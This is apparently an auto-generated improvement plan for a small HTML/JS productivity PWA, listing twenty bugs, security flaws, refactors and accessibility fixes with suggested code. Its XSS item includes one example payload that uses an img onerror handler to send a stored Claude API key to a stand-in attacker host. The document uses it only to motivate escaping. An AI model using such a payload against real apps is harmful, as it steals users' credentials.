# Givelink / Life OS — Improvement Plan

> Generated: 2026-04-27  
> Codebase: single-file vanilla HTML/JS/CSS PWA (`index.html` 4 583 lines, `givelink.html` 2 241 lines, `sw.js`)  
> Max 20 items, ordered by ROI within each tier.

---

## 🔥 P0 — Ship this week (bugs breaking user flows)

### 1. `toast()` and `esc()` are undefined in `index.html` — every feedback message crashes

- **What**: `index.html` calls `toast()` ~66 times and `esc()` ~8 times, but both functions and the `<div id="toast">` element only exist in `givelink.html`.
- **Where**: `index.html` — callers at lines 1317, 2286, 2295, 2350, 2353, 2399, 2414, 2451, 2454, 2467, 2527, 2535, 2590, 2649, 2669, 2706, 2988, 3103, 3136–3169, 3302, 3327, 3336, 3363, 3371, 3497, 3546, 3708, 3942, 4054, 4060, 4153, 4225, 4233, 4320, 4326, 4330, 4369, 4383+; `esc()` at 4023, 4025, 4035, 4090, 4094, 4128, 4139, 4182.
- **Why it matters**: Every save confirmation ("Task added ✓"), every AI interaction response, every validation warning, every data export/import, and every weekly/monthly plan "Add" button silently throws `ReferenceError: toast is not defined`. Users see nothing — no success, no error. The catch block at line 2295 that *should* surface AI errors also throws, meaning network failures are invisible.
- **Effort**: S
- **Suggested fix**:
  - Extract `toast()`, `esc()`, and `<div id="toast">` into a shared `utils.js` loaded by both HTML files.
  - Or duplicate the ~15-line `toast()` + `esc()` implementation and the toast `<div>` directly into `index.html` as a quick stop-gap.
  - Verify the `id="toast"` div exists in `index.html` after the fix.

---

### 2. `checkEatTheFrog()` crashes every dashboard load before 11 am

- **What**: `checkEatTheFrog()` (line ~2824) references `document.getElementById('frog-task')` and `document.getElementById('frog-modal')` — neither element exists anywhere in `index.html`.
- **Where**: `index.html` lines ~2824–2836. Elements `frog-modal` and `frog-task` are absent from the entire file.
- **Why it matters**: This function is called on every dashboard render when the time is before 11:00. Every morning session ends with an uncaught `TypeError: Cannot set properties of null` on the first `.textContent =` call, breaking the rest of the dashboard setup code that follows.
- **Effort**: S
- **Suggested fix**:
  - Add the missing `<div id="frog-modal" class="modal hidden">` and `<span id="frog-task"></span>` elements to `index.html`, mirroring the Eat-the-Frog modal structure.
  - Or remove `checkEatTheFrog()` and its call site if the feature was intentionally dropped.
  - Add a null guard `if(!document.getElementById('frog-task')) return;` at the function entry as a temporary safety net.

---

### 3. `curView` is undeclared in `index.html` — AI task suggestions never re-render

- **What**: `addAISuggestedTask()` (lines 4055–4056) reads `curView` to decide whether to re-render `renderWeeklyPlan()` or `renderMonthlyPlan()`. `curView` is declared only in `givelink.html`.
- **Where**: `index.html` lines 4055–4056.
- **Why it matters**: After a user accepts an AI-suggested task in the weekly or monthly plan, the plan view does not refresh. The new task is saved but invisible until the user navigates away and back — looks like the feature is broken.
- **Effort**: S
- **Suggested fix**:
  - Declare `let curView = '';` at module scope in `index.html` and set it wherever `showView()` is called.
  - Or pass the target view name as a parameter to `addAISuggestedTask(task, view)` and call the relevant render function directly.

---

### 4. `completeLadderWeek()` writes incompatible schema to `discomfortLogs`

- **What**: When a ladder week is completed, the log entry uses fields `intensity` and `title`; the Discomfort view reads `difficulty` and `type` — the two schemas never match.
- **Where**: `index.html` lines ~3309–3312 (write) vs. lines ~2680–2700 (read/render).
- **Why it matters**: Every ladder completion is logged but rendered as a blank or broken entry in the Discomfort Exposure tracker. Users lose their ladder progress history silently.
- **Effort**: S
- **Suggested fix**:
  - Change `completeLadderWeek()` to write `{ difficulty: w.hard, type: '[Ladder W'+week+'] '+w.title, ... }` matching the schema the render function expects.
  - Run a one-time migration on load: `S.discomfortLogs.forEach(d => { if(d.intensity !== undefined && d.difficulty === undefined) { d.difficulty = d.intensity; d.type = d.title; delete d.intensity; delete d.title; } })`.

---

## ⚡ P1 — High ROI (UX friction blocking conversion)

### 5. XSS: ~30 `innerHTML` assignments inject raw user-typed strings

- **What**: Task titles, goal descriptions, notes, decision text, and relationship names are interpolated directly into `innerHTML` without HTML-escaping, enabling stored XSS.
- **Where**: `index.html` — `renderTop3()` line 1264, `inboxHTML()` line 1295, bucket cards lines 1332/1355, goal cards lines 1390/1430, `tcHTML()` line 1524, `renderFocusRecs()` line 1751, AI Lab list lines 2432–2433, Relationships lines 2487/2491, Discomfort line 2692, Challenge history line 3091, Commitment modal line 3523, Someday Audit line 3696, Review History lines 3978–3980, EOD quick-pick line 4295, Decision Journal line 4348.
- **Why it matters**: Any task title like `<img src=x onerror="fetch('https://evil.example/'+localStorage.getItem('claudeKey'))">` exfiltrates the stored Claude API key. Even in a personal-use app, if a sharing/collaboration feature is ever added this becomes critical.
- **Effort**: M
- **Suggested fix**:
  - Add a global `esc(s)` utility (see P0 #1): `s => String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;')`.
  - Replace all `${t.title}`, `${g.title}`, `${r.notes}` etc. in innerHTML strings with `${esc(t.title)}` etc.
  - The `esc()` calls already present on lines 4023–4182 show the pattern — extend it to the ~30 missing sites.

---

### 6. Weekly plan: tasks added via normal modal never appear on day columns

- **What**: `renderWeeklyPlan()` filters tasks by `t.dueDay === dateStr`, but the standard task-add modal sets `dueDate` (not `dueDay`). Only tasks scheduled via `scheduleTaskDay()` / `openAddTaskDay()` ever populate day columns.
- **Where**: `index.html` — render at line ~4013, field set at ~4045/4049, standard modal sets `dueDate` not `dueDay`.
- **Why it matters**: Users who add tasks with a due date expecting them to appear in the weekly plan will find the plan always empty. Core feature appears broken.
- **Effort**: S
- **Suggested fix**:
  - In `renderWeeklyPlan()`, also match on `t.dueDate === dateStr` (falling back from `dueDay`).
  - Or normalise on save: when `dueDate` is set, also set `dueDay = dueDate` so there is one canonical field.

---

### 7. `saveDecision()` uses `Date.now()` for IDs — breaks delete/edit lookups

- **What**: Decision records are created with `id: Date.now()` (numeric) while all other entities use `uid()` (alphanumeric string). Any code doing `id === someId` comparisons will type-mismatch.
- **Where**: `index.html` line ~4372.
- **Why it matters**: If a delete or edit function is ever added to Decision Journal, ID lookups will silently fail because `1745000000000 === '1745000000000'` is false in strict equality. Corrupts future migrations.
- **Effort**: S
- **Suggested fix**:
  - Change line ~4372 to `id: uid()` — single character change, consistent with every other entity in the app.

---

### 8. Silent AI failures — users see nothing when `callClaude` returns null

- **What**: When the Claude API call fails (wrong key, network error, rate limit), `callClaude()` returns `null`. Most callers do `if(result) showAiOut(...)` and silently do nothing — no error message, no visual feedback.
- **Where**: `index.html` — `aiRelNudge()` line ~2543, `aiSuggestAutomations()` line ~2467, `genAIChallenge()` line ~3162, `aiPreMortem()` line ~2339, plus all callers in the weekly/monthly plan.
- **Why it matters**: Users click an AI button, wait, and nothing happens. They assume the feature is broken or they've done something wrong, eroding trust in the entire AI feature set.
- **Effort**: S
- **Suggested fix**:
  - In each caller, add an `else` branch: `else showAiOut('Error', 'Could not reach Claude. Check your API key in Settings.')`.
  - Or add the error message inside `callClaude()` itself so every caller gets it for free.
  - Ensure the fix lands after P0 #1 (toast) is fixed so the error path actually works.

---

### 9. Loading state for AI calls depends entirely on broken `toast()`

- **What**: All AI feature loading indicators are `toast('⏳ Thinking...')` calls, which are broken (see P0 #1). Users see no spinner or loading state while waiting for Claude responses (which can take 5–15 s).
- **Where**: `index.html` — all `callClaude()` call sites; safe alternatives exist at lines ~3567 (`body.textContent = '⏳'`) and ~2856 (`el.innerHTML = '⏳'`).
- **Why it matters**: The app appears frozen during AI calls. Users click the button again, fire duplicate requests, or abandon the feature.
- **Effort**: S
- **Suggested fix**:
  - After P0 #1 is fixed, toast will work and this resolves automatically.
  - As an extra layer, disable the trigger button and show inline text in the AI output container while awaiting (same pattern as weekly/monthly plan AI buttons at lines ~4061/4154).

---

### 10. Claude model ID hardcoded in two places — will drift when model changes

- **What**: The string `'claude-haiku-4-5-20251001'` is hardcoded at lines ~2291 (main `callClaude`) and ~4214 (`testClaudeKey`) and will need to be updated in two places every time the model changes.
- **Where**: `index.html` lines ~2291 and ~4214.
- **Why it matters**: When `claude-haiku-4-5-20251001` is retired, one of the two call sites will likely be missed, causing the test to pass with the new model while the actual AI calls fail with a 404.
- **Effort**: S
- **Suggested fix**:
  - Add `const CLAUDE_MODEL = 'claude-haiku-4-5-20251001';` near the top of the `<script>` block.
  - Replace both hardcoded strings with `CLAUDE_MODEL`.

---

## 🛠 P2 — Code health (tech debt slowing velocity)

### 11. Streak calculation duplicated 4 times — extract `_calcStreak(dateSet, maxDays)`

- **What**: The same loop (iterate back N days, check a Set, increment on match, break on miss) is copy-pasted verbatim for habits, deep work, discomfort, and challenge streaks.
- **Where**: `index.html` — `_habitStreak()` line ~2633, `_dwStreakDays()` line ~2736, `_discomfortStreak()` line ~2771, `_challengeStreak()` line ~3033.
- **Why it matters**: A bug fix or streak-logic change (e.g., "allow a 1-day grace period") must be applied in four places. Three of the four copies will inevitably drift.
- **Effort**: S
- **Suggested fix**:
  - Extract: `function _calcStreak(dateSet, maxDays=365) { let s=0,d=new Date(); for(let i=0;i<maxDays;i++){const k=d.toISOString().slice(0,10); if(!dateSet.has(k))break; s++; d.setDate(d.getDate()-1);} return s; }`.
  - Replace all four implementations with calls to `_calcStreak(new Set(S.habitLogs.map(...)), 365)` etc.

---

### 12. "Monday of current week" calculation duplicated 8 times — extract `getMonday()`

- **What**: The expression `const mon = new Date(); mon.setDate(mon.getDate() - ((mon.getDay() + 6) % 7));` appears verbatim at 8 call sites.
- **Where**: `index.html` lines ~1466, ~1570, ~2552, ~2804, ~2895, ~2952, ~2968, ~3569.
- **Why it matters**: If the week-start logic ever needs to change (locale settings, user preference for Sunday start), all 8 sites must be updated. One site will be missed.
- **Effort**: S
- **Suggested fix**:
  - Extract: `function getMonday(d=new Date()){const r=new Date(d); r.setDate(r.getDate()-((r.getDay()+6)%7)); r.setHours(0,0,0,0); return r;}`.
  - Replace all 8 inline calculations with `getMonday()`.

---

### 13. Bucket colors defined twice (CSS variables + JS `BCOLORS` constant)

- **What**: The five bucket colors are defined as CSS custom properties (`:root` line ~18) and again as a hardcoded JS object `BCOLORS` (line ~1190). They must be kept in sync manually.
- **Where**: `index.html` lines ~15–20 (CSS) and ~1190 (JS).
- **Why it matters**: If a bucket color is updated in CSS, the JS-rendered bucket badges will still show the old color (and vice versa), causing visual inconsistency across the app.
- **Effort**: S
- **Suggested fix**:
  - Remove `BCOLORS` entirely.
  - In the JS, read the current values from CSS: `getComputedStyle(document.documentElement).getPropertyValue('--bw')` (or define an inline map keyed to the CSS var names).
  - Or move the source of truth to JS and set CSS vars programmatically on init.

---

### 14. `#22c55e`/`#ef4444` vs `#69db7c`/`#ff6b6b` — two different greens and reds in the same UI

- **What**: Weekly and monthly plan progress bars (lines ~3998–4115) use Tailwind's `#22c55e` (green) and `#ef4444` (red), while all other success/error indicators use the system palette colors `#69db7c` and `#ff6b6b`.
- **Where**: `index.html` lines ~236, ~238, ~3998, ~4002, ~4112, ~4115.
- **Why it matters**: Success states look slightly different depending on which view you're in. Small but erodes visual polish; `#ef4444` in particular has noticeably different contrast on the dark background.
- **Effort**: S
- **Suggested fix**:
  - Replace `#22c55e` → `var(--bb)` and `#ef4444` → `var(--q1)` at all 6 sites.
  - Add `--bb` and `--q1` to `:root` if they aren't already present as named variables (they appear to be hardcoded rather than variabilised).

---

### 15. Service worker registration has no `.catch()` — silent failure on HTTP

- **What**: `navigator.serviceWorker.register('./sw.js')` at line ~4261 has no error handler. If registration fails (HTTP dev environment, scope mismatch, parse error in `sw.js`), the error is silently swallowed.
- **Where**: `index.html` line ~4261.
- **Why it matters**: Offline support and cache invalidation silently don't work. Developers running on HTTP locally will never see why the app doesn't cache correctly.
- **Effort**: S
- **Suggested fix**:
  - Add `.catch(err => console.warn('SW registration failed:', err))` — a single line.

---

## 💡 P3 — Nice to have

### 16. Modal accessibility: no `role="dialog"`, no `aria-modal`, no focus trapping

- **What**: All modals are plain `<div class="modal">` with no ARIA roles, no focus management, and no `aria-label`. Modal close buttons (`×`) have no `aria-label`.
- **Where**: `index.html` — all `.modal` elements throughout the file; close buttons at ~50 locations.
- **Why it matters**: Screen reader users cannot identify modals as dialogs, and focus is not moved into or trapped within the modal. Keyboard users must tab through the entire page to reach modal content.
- **Effort**: M
- **Suggested fix**:
  - Add `role="dialog" aria-modal="true" aria-labelledby="<heading-id>"` to each modal div.
  - Add `aria-label="Close"` to each `×` button.
  - On `modal.classList.remove('hidden')`, focus the first interactive element inside; restore focus to the trigger on close.

---

### 17. Checkboxes and nav items are `<div>` — not keyboard-accessible

- **What**: Task checkboxes (`.ck`), habit checkboxes (`.habit-ck`), and navigation items (`.ni`) are `<div>` elements with `onclick`, making them inaccessible to keyboard-only users.
- **Where**: `index.html` — `.ck` pattern used throughout `tcHTML()` (~line 1524); `.ni` items at ~lines 284–310.
- **Why it matters**: Any user navigating by keyboard (power users, accessibility needs) cannot check tasks or navigate views without a mouse.
- **Effort**: M
- **Suggested fix**:
  - Change `.ck` divs to `<button class="ck" aria-checked="false" role="checkbox">` or `<input type="checkbox">` with a custom CSS label.
  - Change `.ni` items to `<button class="ni">` to get free keyboard focus and Enter/Space activation.
  - Add `tabindex="0"` and `onkeydown` as a minimal stop-gap if a full refactor is not feasible.

---

### 18. Form labels not linked to inputs — screen readers cannot associate them

- **What**: Most form fields have a visible `<label>` or `<div>` as a label, but the label is not connected to the input via `for`/`id` attributes.
- **Where**: `index.html` — task add modal (~lines 400–480), goal modal (~lines 500–560), settings panel (~lines 600–700), and most other modal forms throughout.
- **Why it matters**: Screen readers announce inputs without their field name. Voice control users cannot target fields by label name ("click Due Date").
- **Effort**: S
- **Suggested fix**:
  - For each `<input>` or `<select>`, add a unique `id` (e.g., `id="task-title-input"`).
  - Add `for="task-title-input"` to the corresponding `<label>` element.
  - No visual change required — purely semantic.

---

### 19. `gold` CSS keyword and cross-file accent colour inconsistency

- **What**: The top-goal card uses the CSS keyword `gold` for its border (lines ~132, ~185 in `index.html`). `givelink.html` uses `--accent: #3b82f6` while `index.html` uses `--accent: #58a6ff` — two different blues for the same conceptual accent role.
- **Where**: `index.html` lines ~132, ~185; `givelink.html` `:root` block.
- **Why it matters**: Minor visual inconsistency, but `gold` is not a defined design token and will differ across browsers/OS rendering. The accent mismatch is visible when switching between the two apps via the app switcher.
- **Effort**: S
- **Suggested fix**:
  - Replace `gold` with a CSS variable `--top-goal: #f5a623` (or whichever gold is intended) defined in `:root`.
  - Align `givelink.html`'s `--accent` to `#58a6ff` to match `index.html`, or define a single `shared.css` with common variables.

---

### 20. `manifest.json` `theme-color` is `#58a6ff` (blue) — does not match brand palette

- **What**: The PWA manifest specifies `theme-color: #58a6ff`, so the browser chrome (mobile address bar, task switcher) renders in blue rather than the brand purple.
- **Where**: `manifest.json` line ~8; `manifest-givelink.json` (assumed same).
- **Why it matters**: When added to home screen, the app's chrome colour signals "GitHub" not "Givelink". Small branding miss, but immediately visible on mobile.
- **Effort**: S
- **Suggested fix**:
  - Change `theme-color` to `#5718CA` (brand purple) in both manifest files.
  - Update the matching `<meta name="theme-color">` tag in both HTML files if present.
